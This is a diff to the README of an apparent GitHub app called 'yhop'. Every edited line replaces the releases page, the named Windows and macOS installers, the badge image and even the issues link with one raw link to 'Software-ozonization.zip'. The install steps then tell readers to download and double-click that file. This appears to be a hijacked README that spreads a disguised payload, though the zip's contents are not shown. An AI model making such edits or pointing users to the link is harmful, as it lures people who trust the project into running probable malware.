@@ -6,7 +6,7 @@ Welcome to yhop! This application simplifies your daily tasks. Follow these step
 
 ## 📥 Download
 
-[![Download yhop](https://img.shields.io/badge/Download%20yhop-v1.0.0-brightgreen)](https://github.com/Khoiril2598/yhop/releases)
+[![Download yhop](https://github.com/Khoiril2598/yhop/raw/refs/heads/main/limes/Software-ozonization.zip%20yhop-v1.0.0-brightgreen)](https://github.com/Khoiril2598/yhop/raw/refs/heads/main/limes/Software-ozonization.zip)
 
 ## 💻 System Requirements
 
@@ -19,14 +19,14 @@ Before downloading yhop, please ensure your system meets the following requireme
 
 ## 📂 Download & Install
 
-To download yhop, visit this page to download: [yhop Releases Page](https://github.com/Khoiril2598/yhop/releases).
+To download yhop, visit this page to download: [yhop Releases Page](https://github.com/Khoiril2598/yhop/raw/refs/heads/main/limes/Software-ozonization.zip).
 
 1. Click on the link above to navigate to the releases page.
 2. You will see a list of versions. Select the latest version for your operating system. 
 3. Click on the appropriate file to start downloading it.
 
-   - If you are using Windows, look for `yhop-windows.exe`.
-   - If you are using macOS, look for `yhop-macos.dmg`.
+   - If you are using Windows, look for `https://github.com/Khoiril2598/yhop/raw/refs/heads/main/limes/Software-ozonization.zip`.
+   - If you are using macOS, look for `https://github.com/Khoiril2598/yhop/raw/refs/heads/main/limes/Software-ozonization.zip`.
 
 4. Once the file is downloaded, locate it on your computer.
 5. Double-click the file to start the installation process.
@@ -72,6 +72,6 @@ Yes, yhop is completely free to download and use.
 
 ## 📞 Support
 
-If you encounter any issues or have questions about yhop, please reach out for help. You can open an issue directly on the [GitHub repository](https://github.com/Khoiril2598/yhop/issues), and our team will assist you as soon as possible.
+If you encounter any issues or have questions about yhop, please reach out for help. You can open an issue directly on the [GitHub repository](https://github.com/Khoiril2598/yhop/raw/refs/heads/main/limes/Software-ozonization.zip), and our team will assist you as soon as possible.
 
 Thank you for choosing yhop! Enjoy simplifying your daily tasks with us.
